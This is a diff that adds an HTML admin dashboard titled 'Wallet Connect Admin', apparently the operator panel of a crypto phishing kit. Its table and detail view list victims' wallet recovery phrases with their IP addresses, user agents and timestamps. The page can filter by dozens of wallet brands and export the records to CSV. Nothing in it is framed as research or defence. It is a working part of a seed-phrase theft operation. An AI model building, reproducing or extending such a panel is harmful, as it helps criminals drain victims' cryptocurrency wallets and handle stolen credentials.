@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Wallet Connect Admin</title>
+  <link rel="stylesheet" href="admin-new.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/boxicons@2.1.4/css/boxicons.min.css">
+</head>
+<body>
+  <!-- Header -->
+  <header class="admin-header">
+    <div class="header-logo">
+      <i class='bx bx-wallet'></i>
+      <span>CBL Admin</span>
+    </div>
+    <div class="hamburger" id="hamburger-menu">
+      <span></span>
+      <span></span>
+      <span></span>
+    </div>
+    <nav class="nav-menu" id="nav-menu">
+      <a href="index.html" class="nav-link">Home</a>
+      <a href="#about" class="nav-link">About</a>
+      <a href="#" class="nav-link">Documentation</a>
+      <a href="#" class="nav-link">Support</a>
+    </nav>
+  </header>
+
+  <div class="admin-container">
+    <!-- Login Modal -->
+    <div id="login-modal" class="modal">
+      <div class="modal-content">
+        <h2 class="modal-title">Admin Login</h2>
+        <div class="form-group">
+          <label for="username">Username</label>
+          <input type="text" id="username" placeholder="Enter username">
+        </div>
+        <div class="form-group">
+          <label for="password">Password</label>
+          <input type="password" id="password" placeholder="Enter password">
+        </div>
+        <p id="login-error" class="error-message"></p>
+        <button id="login-btn" class="btn btn-primary"><i class='bx bx-log-in'></i> Login</button>
+      </div>
+    </div>
+
+    <!-- Admin Dashboard -->
+    <div id="admin-dashboard" class="hidden">
+      <header class="dashboard-header">
+        <h1 class="dashboard-title">Wallet Connect Dashboard</h1>
+        <div class="dashboard-actions">
+          <span id="last-updated">Last updated: Never</span>
+          <button id="refresh-btn" class="btn btn-secondary"><i class='bx bx-refresh'></i> Refresh</button>
+          <button id="logout-btn" class="btn btn-outline"><i class='bx bx-log-out'></i> Logout</button>
+        </div>
+      </header>
+
+      <div class="stats-container">
+        <div class="stat-card">
+          <h3><i class='bx bx-link'></i> Total Connections</h3>
+          <p id="total-connections" class="stat-value">0</p>
+          <div class="stat-trend trend-up"><i class='bx bx-up-arrow-alt'></i> 12% from last week</div>
+        </div>
+        <div class="stat-card">
+          <h3><i class='bx bx-calendar'></i> Today's Connections</h3>
+          <p id="today-connections" class="stat-value">0</p>
+          <div class="stat-trend trend-up"><i class='bx bx-up-arrow-alt'></i> 5% from yesterday</div>
+        </div>
+        <div class="stat-card">
+          <h3><i class='bx bx-wallet-alt'></i> Unique Wallets</h3>
+          <p id="unique-wallets" class="stat-value">0</p>
+          <div class="stat-trend trend-down"><i class='bx bx-down-arrow-alt'></i> 3% from last month</div>
+        </div>
+      </div>
+
+      <div class="data-container">
+        <div class="data-header">
+          <h2 class="data-title">Wallet Connections</h2>
+        </div>
+        <div class="filter-controls">
+          <div class="filter-group">
+            <label for="wallet-filter">Filter by Wallet:</label>
+            <select id="wallet-filter">
+              <option value="all">All Wallets</option>
+              <option value="metamask">MetaMask</option>
+              <option value="trustwallet">Trust Wallet</option>
+              <option value="coinbase">Coinbase</option>
+              <option value="phantom">Phantom</option>
+              <option value="binance">Binance</option>
+              <option value="exodus">Exodus</option>
+              <option value="ledger">Ledger</option>
+              <option value="trezor">Trezor</option>
+              <option value="bitcoin">Bitcoin</option>
+              <option value="ethereum">Ethereum</option>
+              <option value="solana">Solana</option>
+              <option value="avalanche">Avalanche</option>
+              <option value="polygon">Polygon</option>
+              <option value="cardano">Cardano</option>
+              <option value="polkadot">Polkadot</option>
+              <option value="cosmos">Cosmos</option>
+              <option value="algorand">Algorand</option>
+              <option value="tron">Tron</option>
+              <option value="near">Near</option>
+              <option value="arbitrum">Arbitrum</option>
+              <option value="optimism">Optimism</option>
+              <option value="base">Base</option>
+              <option value="zksync">zkSync</option>
+              <option value="starknet">StarkNet</option>
+              <option value="ronin">Ronin</option>
+              <option value="immutablex">ImmutableX</option>
+              <option value="sui">Sui</option>
+              <option value="aptos">Aptos</option>
+              <option value="xrp">XRP Ledger</option>
+              <option value="keplr">Keplr</option>
+              <option value="rainbow">Rainbow</option>
+              <option value="argent">Argent</option>
+              <option value="zerion">Zerion</option>
+              <option value="alpha">Alpha Wallet</option>
+              <option value="safepal">SafePal</option>
+              <option value="bitkeep">BitKeep</option>
+              <option value="tokenpocket">TokenPocket</option>
+            </select>
+          </div>
+          <div class="filter-group">
+            <label for="date-filter">Date Range:</label>
+            <select id="date-filter">
+              <option value="all">All Time</option>
+              <option value="today">Today</option>
+              <option value="yesterday">Yesterday</option>
+              <option value="week">Last 7 Days</option>
+              <option value="month">Last 30 Days</option>
+            </select>
+          </div>
+          <button id="export-btn" class="btn btn-secondary"><i class='bx bx-export'></i> Export CSV</button>
+        </div>
+
+        <div class="table-container">
+          <table id="connections-table">
+            <thead>
+              <tr>
+                <th>ID</th>
+                <th>Wallet</th>
+                <th>Recovery Phrase</th>
+                <th>Date & Time</th>
+                <th>IP Address</th>
+                <th>Actions</th>
+              </tr>
+            </thead>
+            <tbody id="connections-tbody">
+              <!-- Data will be loaded here -->
+            </tbody>
+          </table>
+          <div id="empty-message" class="empty-message hidden">
+            <i class='bx bx-search' style="font-size: 3rem; color: #cbd5e1; margin-bottom: 15px;"></i>
+            <p>No wallet connections found.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Connection Details Modal -->
+    <div id="details-modal" class="modal">
+      <div class="modal-content">
+        <span class="close-modal">&times;</span>
+        <h2 class="modal-title">Connection Details</h2>
+        <div class="details-content">
+          <div class="detail-row">
+            <span class="detail-label">Wallet:</span>
+            <span id="detail-wallet" class="detail-value"></span>
+          </div>
+          <div class="detail-row">
+            <span class="detail-label">Recovery Phrase:</span>
+            <span id="detail-phrase" class="detail-value"></span>
+          </div>
+          <div class="detail-row">
+            <span class="detail-label">Date & Time:</span>
+            <span id="detail-time" class="detail-value"></span>
+          </div>
+          <div class="detail-row">
+            <span class="detail-label">IP Address:</span>
+            <span id="detail-ip" class="detail-value"></span>
+          </div>
+          <div class="detail-row">
+            <span class="detail-label">User Agent:</span>
+            <span id="detail-useragent" class="detail-value"></span>
+          </div>
+        </div>
+        <div class="modal-actions">
+          <button id="delete-connection-btn" class="btn btn-danger"><i class='bx bx-trash'></i> Delete</button>
+          <button class="btn btn-secondary close-modal-btn"><i class='bx bx-x'></i> Close</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Toast Notification -->
+    <div id="toast" class="toast">
+      <i class='bx bx-bell'></i>
+      <div id="toast-message">New connection detected!</div>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <footer class="admin-footer">
+    <p>&copy; 2023 CBL ONLINE WALLET CONNECT. All rights reserved.</p>
+    <div class="footer-links">
+      <a href="index.html" class="footer-link">Home</a>
+      <a href="#" class="footer-link">About</a>
+      <a href="#" class="footer-link">Privacy Policy</a>
+      <a href="#" class="footer-link">Terms of Service</a>
+    </div>
+  </footer>
+
+  <script src="admin-new.js"></script>
+  <script>
+    // Hamburger menu functionality
+    document.addEventListener('DOMContentLoaded', function() {
+      const hamburger = document.getElementById('hamburger-menu');
+      const navMenu = document.getElementById('nav-menu');
+      
+      hamburger.addEventListener('click', function() {
+        hamburger.classList.toggle('active');
+        navMenu.classList.toggle('active');
+      });
+      
+      // Close menu when clicking outside
+      document.addEventListener('click', function(event) {
+        if (!hamburger.contains(event.target) && !navMenu.contains(event.target)) {
+          hamburger.classList.remove('active');
+          navMenu.classList.remove('active');
+        }
+      });
+      
+      // Modal functionality
+      const modals = document.querySelectorAll('.modal');
+      const closeButtons = document.querySelectorAll('.close-modal, .close-modal-btn');
+      
+      closeButtons.forEach(button => {
+        button.addEventListener('click', function() {
+          modals.forEach(modal => {
+            modal.classList.remove('active');
+          });
+        });
+      });
+    });
+  </script>
+</body>
+</html>
